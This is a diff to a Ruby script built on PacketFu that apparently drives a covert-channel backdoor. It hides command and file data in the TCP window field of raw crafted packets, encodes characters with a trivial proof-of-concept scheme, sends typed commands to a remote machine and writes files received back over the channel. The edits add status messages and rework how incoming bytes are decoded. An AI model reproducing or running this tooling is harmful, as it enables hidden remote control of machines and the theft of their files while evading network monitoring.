@@ -26,7 +26,7 @@ end
 # -----------------------------------------------------------------------------------------
 def send_command(cmd)
 
-
+puts "command:" + cmd
 #Fill in TCP Packet
 pkt = PacketFu::TCPPacket.new
 
@@ -62,18 +62,15 @@ def recv_data(display = false)
             if packet.ip_daddr == @options[:source_ip]
 
                 if packet.tcp_flags.fin == 1 then
-                               
+    
                     return data
                 else
                     if data.nil? then
                         data = packet.tcp_win.chr
-                        
                     else #not nill
-                        begin
-                            data = data + packet.tcp_win.chr(Encoding::UTF_8)
-                        rescue
+                        data << packet.tcp_win.chr
                             
-                        end
+                        
                     end 
             end #fin == 1
           end #ptk.tcp_dst 
@@ -95,7 +92,7 @@ end
 
 def recv_file()
     filename = recv_data()
-
+    
     if filename == '#'
         puts "Server could not find remote file."
         return
@@ -107,6 +104,9 @@ def recv_file()
         file.putc(c)
     end
     file.close()
+    puts "Recieved #{filename}."
+    send_fin()    
+    prompt()
 
 end
 
@@ -133,7 +133,6 @@ def send_char(pkt, c)
     pkt.tcp_win = (c * 20)/5 # our encryption for proof of concept * 20 and / 5
 
     pkt.recalc
-
 
     pkt.to_w(@options[:iface])
     sleep(@options[:delay].to_i)
@@ -170,9 +169,10 @@ end
 # -----------------------------------------------------------------------------------------
 
 def prompt
-
+    command = nil
     print("Enter command > ");
     command = gets.chomp()
+
     cmds = command.split(' ')
 
     if cmds[0] == 'quit' or cmds[0] == 'exit'
@@ -180,6 +180,7 @@ def prompt
     end
     #if put is entered, get the following value  
     if cmds[0] == 'get'
+
         send_command(command)
         recv_file()
     
